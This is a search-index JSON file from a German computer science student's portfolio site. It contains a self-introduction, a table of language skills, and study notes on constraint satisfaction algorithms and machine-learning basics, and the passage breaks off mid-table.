{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\ud83d\udc4b Willkommen auf meinem Portfolio","text":""},{"location":"#willkommen-auf-meinem-portfolio","title":"\ud83d\udc4b Willkommen auf meinem Portfolio","text":"<p>Ich bin Nico, Informatikstudent - auf dieser Seite dokumentiere ich systematisch meine Lerninhalte, Projekte und Technologien, mit denen ich im Studium gearbeitet habe. Ziel ist es, nicht nur meine Fortschritte festzuhalten, sondern auch nachvollziehbar zu machen, in welchen Bereichen ich bereits Erfahrung habe und wo ich f\u00fcr Unternehmen potenziell einsetzbar bin.</p>"},{"location":"#was-findest-du-hier","title":"\ud83e\udde0 Was findest du hier?","text":"<ul> <li>\ud83d\udcd8 Kompakte Notizen zu Themen wie Algorithmen, Datenstrukturen, Softwarearchitektur, Netzwerken, IT-Sicherheit und mehr</li> <li>\ud83d\udee0 Eigene Projekte aus dem Studium oder in der Freizeit</li> <li>\ud83d\udca1 Technologie\u00fcbersicht mit Tools, Frameworks und Programmiersprachen</li> </ul>"},{"location":"#und-wer-bin-ich-fachlich","title":"\ud83d\udcac Und wer bin ich fachlich?","text":"<p>Ich habe mit verschiedenen Sprachen gearbeitet - manche h\u00e4ufiger, manche eher punktuell. Insgesamt habe ich ein gutes Gef\u00fchl f\u00fcr Syntax, Struktur und Konzepte - die meisten Grundlagen sind \u00fcbertragbar, und mit etwas Einarbeitung bin ich in neuen Technologien schnell produktiv.</p> Sprache Erfahrung Einsch\u00e4tzung SQL \ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\u26aa Sehr sicher - h\u00e4ufig verwendet CSS \ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\u26aa\u26aa Basis bis solide - f\u00fcr Styling HTML \ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\u26aa\u26aa Gut - Webstrukturierung &amp; Docs Python \ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\u26aa\u26aa Solides Verst\u00e4ndnis Java \ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\u26aa\u26aa Solides Verst\u00e4ndnis C \ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\u26aa\u26aa Solides Verst\u00e4ndnis Scala \ud83d\udfe2\ud83d\udfe2\u26aa\u26aa\u26aa Solides Verst\u00e4ndnis Assembler \ud83d\udfe2\u26aa\u26aa\u26aa\u26aa Nur grundlegende Kenntnisse C++ \ud83d\udfe2\u26aa\u26aa\u26aa\u26aa Bisher wenig aktiv genutzt JavaScript \ud83d\udfe2\u26aa\u26aa\u26aa\u26aa Grundkenntnisse, geringe Praxis \ud83d\udfe2 = Erfahrung / Verst\u00e4ndnis \u26aa = ausbauf\u00e4hig <p>Auch wenn jede Sprache ihre Eigenheiten hat, liegt meine St\u00e4rke besonders im grunds\u00e4tzlichen Verst\u00e4ndnis von Programmierkonzepten, Logik und Softwarestruktur. Die Syntax ist oft nur noch Formsache - mit etwas \u00dcbung finde ich mich in neuen Technologien und Sprachen schnell zurecht, vor allem wenn das Ziel oder Anwendungsgebiet klar ist.</p> <p>\ud83d\udc49 Schau dich ruhig um - die Navigation f\u00fchrt dich durch meine Themenbereiche. Wenn du dir ein Bild davon machen willst, wie ich arbeite oder denke, sind meine Notizen und Projekte ein guter Einstiegspunkt.</p>"},{"location":"projects/","title":"Projects","text":""},{"location":"projects/#projects","title":"Projects","text":"<p>Hallo sehr geehrte Damen und Herren, hier finden Sie ein \u00dcberblick \u00fcber alle bisherigen Projekte  bzw. laufenden Projekte.</p>"},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/","title":"(CSP) Constraint Satisfaction Problem","text":"","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#was-ist-ein-csp-constraint-satisfaction-problem","title":"\ud83d\udd0d Was ist ein CSP (Constraint Satisfaction Problem)?","text":"<p>Bei einem Constraint Satisfaction Problem (CSP) geht es nur um eines:</p> <p>\u2705 Finde eine Zuweisung von Werten zu allen Variablen, sodass alle Constraints (Rahmenbedingungen) erf\u00fcllt sind.</p> <p>Es gibt keinen Gegner, keine Bewertung, kein Gewinnen oder Verlieren - nur:</p> <ul> <li>G\u00fcltig oder nicht g\u00fcltig</li> <li>L\u00f6sbar oder unl\u00f6sbar</li> <li>Eine L\u00f6sung oder keine L\u00f6sung (manchmal auch mehrere)</li> </ul> <p>Ein CSP ist eine Formalisierung eines Problems, das durch drei Dinge beschrieben wird:</p> <ol> <li> <p>Variablen </p> <ul> <li>Was wir bestimmen wollen. \u2192 z.\u202fB. welches Land welche Farbe bekommt.</li> </ul> </li> <li> <p>Wertebereiche (Domains) </p> <ul> <li>Welche Werte jede Variable annehmen darf. \u2192 z.\u202fB. {Rot, Gr\u00fcn, Blau} f\u00fcr Farben.</li> </ul> </li> <li> <p>Constraints (Bedingungen) </p> <ul> <li>Welche Kombinationen erlaubt oder verboten sind. \u2192 z.\u202fB. benachbarte L\u00e4nder d\u00fcrfen nicht dieselbe Farbe haben.</li> </ul> </li> </ol> <p>Ein CSP ist gel\u00f6st, wenn:</p> <ul> <li>jede Variable einen Wert zugewiesen bekommt,</li> <li>alle Constraints erf\u00fcllt sind.</li> </ul> <p>\ud83d\udc49 Also: Ein CSP ist eine Klasse von Problemen, und die vorgestellten Algorithmen wie Backtracking, AC-3 oder Min-Conflicts sind Strategien zur L\u00f6sung dieser Art von Problemen.</p>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#beispiele-im-detail-erklart","title":"\ud83d\udcda Beispiele - im Detail erkl\u00e4rt","text":"","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#1-landkartenfarbung","title":"1. Landkartenf\u00e4rbung:","text":"<ul> <li>Variablen: WA, NT, SA, ...</li> <li>Werte: {R, G, B}</li> <li>Constraint: keine benachbarten Regionen d\u00fcrfen die gleiche Farbe haben</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#2-n-damen-problem","title":"2. N-Damen-Problem:","text":"<ul> <li>Ziel: 8 Damen so auf ein Schachbrett setzen, dass sie sich nicht schlagen</li> <li>Constraint: keine zwei Damen in gleicher Zeile, Spalte oder Diagonale</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#3-sudoku","title":"3. Sudoku:","text":"<ul> <li>Variablen: Zellen des Rasters</li> <li>Werte: 1-9</li> <li>Constraints: Jede Zahl darf nur einmal pro Zeile, Spalte und Block vorkommen</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#4-krypto-ratsel-z-b-send-more-money","title":"4. Krypto-R\u00e4tsel (z.\u202fB. SEND + MORE = MONEY):","text":"<ul> <li>Buchstaben sind Ziffern</li> <li>Jede Ziffer darf nur einmal vorkommen (Alldiff)</li> <li>Rechenregeln gelten als Constraints</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#5-stundenplanung-timetabling","title":"5. Stundenplanung (Timetabling):","text":"<ul> <li>Lehrer, R\u00e4ume, F\u00e4cher - alles muss zusammenpassen</li> <li>Viele Regeln (z.\u202fB. keine Doppelbelegung)</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#1-backtracking-klassische-suche","title":"\ud83e\udde9 1. Backtracking (klassische Suche)","text":"","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#grundidee","title":"\ud83c\udf31 Grundidee:","text":"<p>Man beginnt mit einer leeren Zuweisung und f\u00fcllt sie schrittweise auf:</p> <ul> <li>W\u00e4hle eine Variable</li> <li>Probiere einen Wert aus</li> <li>Pr\u00fcfe, ob das zu bisherigen Zuweisungen passt (also keine Constraint-Verletzung)</li> <li>Wenn ja \u2192 weiter</li> <li>Wenn nein oder sp\u00e4ter keine M\u00f6glichkeit mehr \u2192 zur\u00fcckspringen (= backtrack)</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#tiefensuche","title":"\ud83e\udde0 Tiefensuche:","text":"<p>Backtracking ist eigentlich eine Tiefensuche im Suchbaum:</p> <ul> <li>Jeder Pfad ist ein m\u00f6glicher L\u00f6sungsversuch</li> <li>Jeder Knoten = Zuweisung einer Variable</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#heuristiken-im-backtracking","title":"\ud83d\udd0d Heuristiken im Backtracking:","text":"<ol> <li>Most Constrained Variable First: Variable mit wenigsten erlaubten Werten zuerst w\u00e4hlen</li> <li>Most Constraining Variable: Variable, die die meisten anderen beeinflusst</li> <li>Least Constraining Value: Farbe w\u00e4hlen, die den Nachbarn am meisten Optionen l\u00e4sst</li> </ol>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#2-forward-checking-fruhzeitige-prufung","title":"\ud83d\udd10 2. Forward Checking - Fr\u00fchzeitige Pr\u00fcfung","text":"","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#was-passiert-hier","title":"\ud83d\udd0d Was passiert hier?","text":"<p>Immer wenn eine Variable einen Wert bekommt, pr\u00fcfe alle benachbarten Variablen:</p> <ul> <li>Welche Werte sind dort jetzt noch erlaubt, angesichts der neuen Zuweisung?</li> <li>Streiche verbotene Werte (die gegen Constraints versto\u00dfen w\u00fcrden)</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#wenn-bei-einer-variable-kein-wert-mehr-moglich-ist","title":"\ud83d\uded1 Wenn bei einer Variable kein Wert mehr m\u00f6glich ist:","text":"<p>\u2192 Sofort zur\u00fcckspringen (backtrack) - kein Grund weiter zu suchen.</p>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#vorteil","title":"\ud83d\udccc Vorteil:","text":"<ul> <li>Erkennt Dead Ends sehr fr\u00fch</li> <li>Spart unn\u00f6tige Arbeit tiefer im Suchbaum</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#beispiel","title":"\ud83e\udde0 Beispiel:","text":"<ul> <li>WA = Rot</li> <li>NT kann nur noch Gr\u00fcn oder Blau</li> <li>SA hatte vorher {R, G, B} \u2192 nach Ausschluss: nur noch B</li> <li>Wenn das dann auch unm\u00f6glich ist \u2192 sofort zur\u00fcck!</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#ac-3-arc-consistency-3","title":"\ud83d\udd04 AC-3 (Arc Consistency 3)","text":"","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#ziel","title":"\ud83c\udfaf Ziel:","text":"<p>Einschr\u00e4nkung der Domains, indem unbrauchbare Werte entfernt werden, bevor \u00fcberhaupt nach einer L\u00f6sung gesucht wird.</p>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#warum-ist-das-sinnvoll","title":"\ud83e\udde9 Warum ist das sinnvoll?","text":"<p>Weil:</p> <ul> <li>Wir k\u00f6nnen uns so sp\u00e4ter unn\u00f6tige Suchpfade im Baum sparen</li> <li>Wir erkennen Widerspr\u00fcche, ohne \u00fcberhaupt zu raten oder zu suchen</li> <li>Es ist wie ein \"automatisches Vorfiltern\" aller schlechten M\u00f6glichkeiten</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#vorgehen","title":"\u2699\ufe0f Vorgehen:","text":"<ol> <li>Starte mit allen Kanten (Constraints) im CSP (z.\u202fB. (X,Y))</li> <li>F\u00fcr jede Kante <code>(X,Y)</code> pr\u00fcfe:     Gibt es f\u00fcr jeden Wert x \u2208 Domain(X) einen Wert y \u2208 Domain(Y), sodass der Constraint erf\u00fcllt ist?</li> <li>Wenn nicht, streiche <code>x</code> aus Domain(X)</li> <li>Wenn sich Domain(X) \u00e4ndert \u2192 pr\u00fcfe alle Nachbarn von X erneut</li> <li>Wiederholen, bis keine \u00c4nderung mehr</li> </ol>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#ergebnis","title":"\ud83e\udde0 Ergebnis:","text":"<ul> <li> <p>Jede Domain enth\u00e4lt nur noch Werte, die prinzipiell in einer L\u00f6sung vorkommen k\u00f6nnen</p> </li> <li> <p>Erkennt Widerspr\u00fcche fr\u00fchzeitig (z.\u202fB. leere Domain)</p> </li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#vergleich-zu-anderen-algorithmen","title":"\ud83c\udd9a Vergleich zu anderen Algorithmen","text":"Kriterium Backtracking Forward Checking AC-3 (Constraint Propagation) Wann pr\u00fcft? Nur beim Zuweisen einer Variable Nach jeder Zuweisung: pr\u00fcfe benachbarte Variablen Schon vor der Suche - pr\u00fcft systematisch alle Constraints Was pr\u00fcft? Nur aktuelle Zuweisung Entfernt unpassende Werte bei direkten Nachbarn Entfernt alle inkonsistenten Werte in allen Domains Ziel L\u00f6sung durch systematische Suche Fr\u00fchzeitige Erkennung von lokalen Dead-Ends Globaler Domain-Check auf Konsistenz (Filterung) Vorteil Einfach, aber sp\u00e4t dran Schnelleres Zur\u00fcckspringen bei Problemen Kein Raten n\u00f6tig, erkennt Widerspr\u00fcche ohne Suche Nachteil Erkannt Widerspr\u00fcche sp\u00e4t Noch keine vollst\u00e4ndige Propagation Kann teuer sein (bei vielen Variablen/Constraints) Typ Suchalgorithmus Suche mit lokaler Vorw\u00e4rtspr\u00fcfung Preprocessing / Filter-Algorithmus vor der Suche Betrachtet Constraints zwischen Aktuelle Variable vs. bisherige Aktuelle Variable vs. direkte Nachbarn Jedes (X,Y)-Paar im gesamten Graph Wie weit denkt er voraus? Gar nicht voraus - reagiert nur auf Fehler Pr\u00fcft Nachbar-Domains auf direkte Widerspr\u00fcche Filtert Domains global durch Wiederholungen","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#problemstruktur-nutzen","title":"Problemstruktur nutzen","text":"","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#was-bedeutet-problemstruktur-ausnutzen","title":"Was bedeutet Problemstruktur ausnutzen?","text":"<p>Es hei\u00dft: Bevor du irgendeinen Algorithmus blind loslaufen l\u00e4sst (z.\u202fB. Backtracking), schaust du dir die Form des Problems an - also seine Graphstruktur - um zu erkennen, ob du es einfacher oder effizienter l\u00f6sen kannst.</p>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#vergleich-mit-dem-alltag","title":"\ud83d\udd04 Vergleich mit dem Alltag:","text":"<p>Stell dir vor, du willst ein Puzzle l\u00f6sen:</p> <ul> <li>Du k\u00f6nntest einfach drauflos puzzeln (Backtracking)</li> <li>Oder du schaust zuerst, ob:<ul> <li>Du die Ecken findest \u2192 (Strukturanalyse)</li> <li>Es zwei getrennte Puzzle-Sektionen gibt \u2192 (Komponenten)</li> <li>Ein Bereich besonders kompliziert aussieht \u2192 (Cutset)</li> </ul> </li> </ul> <p>\u27a1\ufe0f Danach entscheidest du, wie du vorgehst</p>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#zusammenhangskomponenten","title":"Zusammenhangskomponenten:","text":"<ul> <li>Wenn das CSP aus unabh\u00e4ngigen Teilen besteht \u2192 bearbeite sie getrennt</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#baumstruktur","title":"Baumstruktur:","text":"<ul> <li>Wenn der Constraint-Graph zyklusfrei ist, kann man sehr schnell l\u00f6sen</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#schnittmengenkonditionierung","title":"Schnittmengenkonditionierung:","text":"<ul> <li>Entferne eine Variable, um einen Baum zu erhalten</li> <li>L\u00f6se das vereinfachte Problem zuerst</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#lokale-suche-mit-min-conflicts-zusammenfassung","title":"\ud83e\udde0 Lokale Suche mit Min-Conflicts - Zusammenfassung","text":"","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#ziel_1","title":"\ud83d\udd0e Ziel:","text":"<p>Finde eine g\u00fcltige L\u00f6sung f\u00fcr ein CSP, indem du schrittweise Konflikte reduzierst, statt den gesamten Suchbaum zu durchsuchen.</p>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#ablauf-des-algorithmus","title":"\ud83d\udd04 Ablauf des Algorithmus:","text":"<ol> <li>Starte mit einer vollst\u00e4ndigen, zuf\u00e4lligen Zuweisung (auch mit Fehlern)</li> <li> <p>Solange Konflikte bestehen:</p> <ul> <li>W\u00e4hle eine Variable, die gerade Konflikte verursacht</li> <li>\u00c4ndere ihren Wert so, dass die Konflikte minimiert werden</li> <li>Wiederhole den Vorgang</li> </ul> </li> <li> <p>Abbruch:</p> <ul> <li>\u2705 Wenn kein Konflikt mehr da ist \u2192 L\u00f6sung gefunden</li> <li>\u274c Oder nach vielen Versuchen \u2192 vermutlich Sackgasse</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#was-bedeutet-lokal","title":"\ud83e\udde9 Was bedeutet \u201elokal\u201c?","text":"<ul> <li>Es wird immer nur eine Variable auf einmal ge\u00e4ndert</li> <li>Es wird nur im direkten \u201eNachbarschaftsbereich\u201c des aktuellen Zustands geschaut</li> <li>Keine globale Sicht, keine R\u00fcckverfolgung</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#starken","title":"\ud83c\udfaf St\u00e4rken:","text":"<ul> <li>Sehr effizient bei gro\u00dfen CSPs (z.\u202fB. N-Damen mit Millionen Feldern)</li> <li>Einfach zu implementieren</li> <li>Schnell - oft in wenigen Schritten zur L\u00f6sung</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#schwachen","title":"\u26a0\ufe0f Schw\u00e4chen:","text":"<ul> <li>Kann in lokalen Minima h\u00e4ngen bleiben     \u2192 Wenn keine \u00c4nderung mehr Konflikte reduziert</li> <li>Abh\u00e4ngig vom Startzustand</li> <li>Heuristik-basiert \u2192 schlechte Heuristik = schlechte Ergebnisse</li> <li>Keine Garantie, eine L\u00f6sung zu finden</li> </ul>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#typische-gegenmanahmen","title":"\ud83d\udee0 Typische Gegenma\u00dfnahmen:","text":"Technik Beschreibung Random Restart Nach festgefahrenem Zustand: komplett neu starten Zufallsbewegung Manchmal bewusst eine \u201eschlechtere\u201c Wahl treffen Mehrfachdurchl\u00e4ufe Algorithmus mehrfach starten, beste L\u00f6sung behalten Hybridverfahren Lokale Suche mit anderen Techniken kombinieren","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#kernaussage","title":"\ud83e\udde0 Kernaussage:","text":"<p>Lokale Suche mit Min-Conflicts ist wie ein \u201eGreedy\u201c-Wanderer: Er startet irgendwo, schaut nur um sich herum, geht dort hin, wo es lokal besser aussieht - aber ohne Karte, ohne R\u00fcckblick, und nur mit Hoffnung, dass es der richtige Weg ist. Also bei schlechter Bewertung des aktuellen Zustands und der Folgezust\u00e4nde(Heuristik) kann man sich schneller in lokalen Minima h\u00e4ngenbleiben</p>","tags":["Course/"]},{"location":"studium/AI/%28CSP%29%20Constraint%20Satisfaction%20Problem/#fazit-wann-nutzt-man-was","title":"\u2705 Fazit: Wann nutzt man was?","text":"Strategie Gut f\u00fcr Vorteil Backtracking Kleine/mittlere Probleme Einfach, systematisch Forward Checking Mittlere Probleme Fr\u00fchzeitiges Erkennen AC-3 Vorverarbeitung, gro\u00dfe Domains Reduziert Suchraum Min-Conflicts Sehr gro\u00dfe Probleme Extrem schnell, aber unvollst\u00e4ndig Graph-Tricks Strukturierte CSPs Nutzt Problemform clever aus","tags":["Course/"]},{"location":"studium/AI/AI-Zusammenfassung/","title":"AI Zusammenfassung","text":""},{"location":"studium/AI/AI-Zusammenfassung/#strukturiertes-lernskript-teil-1-symbolische-ki","title":"\ud83d\udcd8 Strukturiertes Lernskript: Teil 1 - Symbolische KI","text":"<p>(\u2192 aus Klausur SS2021)</p>"},{"location":"studium/AI/AI-Zusammenfassung/#1-suchen-problemlosen","title":"\ud83e\udde0 1. Suchen &amp; Probleml\u00f6sen","text":"<p>Beispielaufgabe (Wasserkrugproblem): Ziel ist ein Zustand mit (x, y, z) = (4, 4, 0)</p> <ul> <li>Zustand = (Inhalt 8l, 5l, 3l)</li> <li>Aktionen = Umf\u00fcllen zwischen Gef\u00e4\u00dfen, nur bis maximal voll oder leer</li> <li> <p>Suchstrategien:</p> <ul> <li>Breitensuche: pr\u00fcft alle M\u00f6glichkeiten pro Ebene \u2192 findet immer k\u00fcrzeste L\u00f6sung</li> <li>Tiefensuche: geht tief in einen Pfad \u2192 nicht garantiert k\u00fcrzeste</li> <li>Iterativ vertiefende Tiefensuche: wie Tiefensuche, aber in Schritten \u2192 findet auch k\u00fcrzeste</li> </ul> </li> </ul> <p>\ud83d\udc49 Merksatz: Breitensuche = optimal, aber speicherintensiv</p>"},{"location":"studium/AI/AI-Zusammenfassung/#2-aussagenlogik-resolution","title":"\ud83e\udde0 2. Aussagenlogik &amp; Resolution","text":""},{"location":"studium/AI/AI-Zusammenfassung/#was-ist-der-resolutionskalkul","title":"Was ist der Resolutionskalk\u00fcl?","text":"<p>Der Resolutionskalk\u00fcl ist ein Verfahren, mit dem man automatisch pr\u00fcfen kann, ob eine Aussage logisch aus anderen Aussagen folgt - also ob ein Argument g\u00fcltig ist.</p> <p>Beispiel:</p> <ul> <li>\u03b1\u2081: a \u2227 b \u2192 c</li> <li>\u03b1\u2082: c \u2192 d \u2228 e</li> <li>\u03b1\u2083: e \u2192 d</li> <li>\u03b3: a \u2192 (b \u2192 d)</li> </ul> <p>\u27a1 Ziel: Mit Resolution zeigen, dass \u03b3 logisch folgt.</p> <p>Schritte:</p> <ol> <li>Umformen in KNF (Konjunktive Normalform)</li> <li>Negation der Zielaussage</li> <li>Resolutionskalk\u00fcl anwenden, bis leere Klausel (Widerspruch) gefunden wird</li> </ol>"},{"location":"studium/AI/AI-Zusammenfassung/#3-constraint-satisfaction-problems-csp","title":"\ud83e\udde0 3. Constraint Satisfaction Problems (CSP)","text":"<p>Beispiel: L\u00e4nder einf\u00e4rben (keine Nachbarn in gleicher Farbe)</p> <ul> <li> <p>Strategien beim Backtracking:</p> <ol> <li>Most Constrained Variable First - w\u00e4hle Land mit wenigsten m\u00f6glichen Farben</li> <li>Most Constraining Variable First - falls Gleichstand: Land mit meisten Nachbarn zuerst</li> <li>Least Constraining Value First - Farbe, die wenig st\u00f6rt</li> <li>Forward Checking - verbietet ung\u00fcltige Farben f\u00fcr Nachbarn nach Farbwahl</li> </ol> </li> </ul> <p>\u27a1 AC-3 Algorithmus: pr\u00fcft Paare (z.\u202fB. Land 1 &amp; 2) und schr\u00e4nkt m\u00f6gliche Farben ein, bis Konsistenz erreicht</p>"},{"location":"studium/AI/AI-Zusammenfassung/#teil-2-maschinelles-lernen-neuronale-netze","title":"\ud83e\udd16 Teil 2 - Maschinelles Lernen &amp; Neuronale Netze","text":"<p>(\u2192 Nachpr\u00fcfung 2021)</p>"},{"location":"studium/AI/AI-Zusammenfassung/#was-ist-one-hot-encoding","title":"Was ist One-Hot-Encoding?","text":"<p>One-Hot-Encoding ist eine Methode, um Kategorien (= Klassen) in Zahlen umzuwandeln, sodass sie von mathematischen Modellen verstanden werden k\u00f6nnen.</p> Klasse One-Hot-Vektor Hund <code>[1, 0, 0]</code> Katze <code>[0, 1, 0]</code> Maus <code>[0, 0, 1]</code>"},{"location":"studium/AI/AI-Zusammenfassung/#allgemein","title":"Allgemein:","text":"<ul> <li>Epoche = einmal durch alle Trainingsdaten</li> <li>Batch Size = wie viele Beispiele gleichzeitig gelernt werden</li> <li>Learning Rate = wie gro\u00df die Schritte beim Gewichts-Update sind</li> <li> <ul> <li>Gewicht (w): multipliziert mit Input</li> </ul> </li> <li>Bias (b): wird addiert, um Verschiebung zu erm\u00f6glichen     \u2192 Funktioniert wie der y-Achsenabschnitt in einer linearen Funktion</li> </ul>"},{"location":"studium/AI/AI-Zusammenfassung/#was-ist-gradient-descent","title":"was ist Gradient Descent?","text":"<ul> <li>ein Fehler/Loss berechnet wird</li> <li>dieser minimiert werden soll</li> </ul>"},{"location":"studium/AI/AI-Zusammenfassung/#was-passiert-in-einem-trainingsschritt","title":"Was passiert in einem Trainingsschritt?","text":"<p>F\u00fcr alle Modelle, von linear bis CNN:</p> <ol> <li>Eingabe durch Netz \u2192 Vorhersage</li> <li>Vergleich mit Zielwert \u2192 Fehler/Loss</li> <li>Gradienten berechnen = Wie stark \u00e4ndert sich der Fehler, wenn ein Gewicht ver\u00e4ndert wird?</li> <li>Gewichte anpassen mit Gradient Descent:     \\(w = w - \\eta \\cdot \\frac{\\partial L}{\\partial w}\u200b\\)</li> <li>Wiederholen (mehr Epochen, mehr Batches)</li> </ol>"},{"location":"studium/AI/AI-Zusammenfassung/#was-ist-backpropagation","title":"was ist Backpropagation?","text":"<p>Backpropagation = \u201eFehler r\u00fcckw\u00e4rts durchs Netz schicken\u201c, um zu wissen, welches Gewicht wie viel Schuld hat</p> <ul> <li>In einfachen Modellen (z.\u202fB. logistische Regression):     Backprop ist nur 1 Schritt r\u00fcckw\u00e4rts</li> <li>In tiefen Netzen (z.\u202fB. MLP, CNN):     Backpropagation l\u00e4uft durch alle Layer zur\u00fcck und berechnet alle Gradienten</li> </ul> Modell Loss-Funktion Aktivierung Optimierungsmethode Lineare Regression MSE - Gradient Descent Logistische Regression Cross Entropy Sigmoid Gradient Descent + Backprop MLP / FCNN / CNN z.\u202fB. Cross Entropy ReLU, Softmax Backprop durch mehrere Schichten"},{"location":"studium/AI/AI-Zusammenfassung/#lineare-regression","title":"\ud83d\udd39 Lineare Regression","text":"<p>Ziel: Einen Zahlenwert vorhersagen (z.\u202fB. Preis, Temperatur)</p> <p>Formel: \\(\\hat{y} = a \\cdot x + b\\)</p> <ul> <li><code>x</code>: Eingabewert (z.\u202fB. Gr\u00f6\u00dfe)</li> <li><code>y</code>: Ausgabewert (z.\u202fB. Gewicht)</li> <li><code>a</code>: Steigung (wie stark y sich mit x ver\u00e4ndert)</li> <li><code>b</code>: Achsenabschnitt (Startwert)</li> </ul> <p>\ud83d\udccc Beispiel: Du m\u00f6chtest das Gewicht einer Person aufgrund ihrer Gr\u00f6\u00dfe sch\u00e4tzen. \u2192 Je gr\u00f6\u00dfer die Person, desto mehr wiegt sie im Schnitt \u2192 Lineare Beziehung</p>"},{"location":"studium/AI/AI-Zusammenfassung/#logistische-regression","title":"\ud83d\udd39 Logistische Regression","text":"<p>Ziel: Eine Wahrscheinlichkeit vorhersagen (z.\u202fB. \u201egeh\u00f6rt zur Klasse 1\u201c)</p> <p>Formel: $$ \\sigma(z) = \\frac{1}{1 + e^{-z}} \\quad \\text{wobei } z = a \\cdot x + b $$</p> <ul> <li>Gibt Wahrscheinlichkeiten zwischen 0 und 1 aus</li> <li>Wird genutzt bei Klassifikationsaufgaben (z.\u202fB. \"Spam oder nicht?\")</li> </ul> <p>\ud83d\udccc Beispiel: Du m\u00f6chtest vorhersagen, ob eine E-Mail Spam ist \u2192 0 = nein, 1 = ja Die logistische Regression berechnet: \u201eWie sicher bin ich mir, dass es Spam ist?\u201c</p> <p>Braucht Aktivierungsfunktion weil es dadurch zug\u00e4nglich f\u00fcr Entscheidungen macht statt nur wie bei der linearen Regression einen Wert zu berechnen</p>"},{"location":"studium/AI/AI-Zusammenfassung/#bekannte-aktivierungsfunktionen","title":"Bekannte Aktivierungsfunktionen:","text":"Funktion Formel Eigenschaften Typischer Einsatz Wof\u00fcr Sigmoid \\(\\sigma(x) = \\frac{1}{1+e^{-x}}\\) gl\u00e4ttet auf [0,1], gut f\u00fcr Wahrscheinlichkeiten Klassifikation (z.\u202fB. logistische Regression, Output Layer) Macht Werte zu Wahrscheinlichkeiten Tanh \\(\\tanh(x) = \\frac{e^x - e^{-x}}{e^x + e^{-x}}\u200b\\) Werte zwischen [-1, 1], aber \u00e4hnlich wie Sigmoid Hidden Layers (fr\u00fcher Standard) Zentriert, hilft bei Gradienten ReLU \\(\\text{ReLU}(x) = \\max(0, x)\\) l\u00e4sst nur positive Werte durch, sehr effizient Hidden Layers (heute Standard) Effizient, verhindert viele Probleme Leaky ReLU \\(x.wenn.x&gt;0, sonst 0.01x\\) wie ReLU, aber kleine Negative erlaubt Hidden Layers (Alternative zu ReLU) Verhindert, dass Neuronen \u201esterben\u201c Softmax \\(\\frac{e^{x_i}}{\\sum e^{x_j}}\\)\u200b\u200b macht Wahrscheinlichkeitsverteilung aus Vektor Multiklass-Klassifikation (Output Layer) Gibt 